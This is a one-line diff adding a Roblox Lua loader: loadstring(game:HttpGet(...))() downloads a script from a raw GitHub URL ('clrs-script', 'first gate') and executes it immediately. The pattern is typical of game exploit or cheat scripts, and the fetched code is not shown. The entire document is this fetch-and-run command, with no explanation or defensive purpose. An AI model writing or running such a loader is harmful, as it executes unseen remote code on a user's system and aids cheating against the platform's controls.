@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Brucezy-fx/clrs-script/refs/heads/main/first%20gate"))()
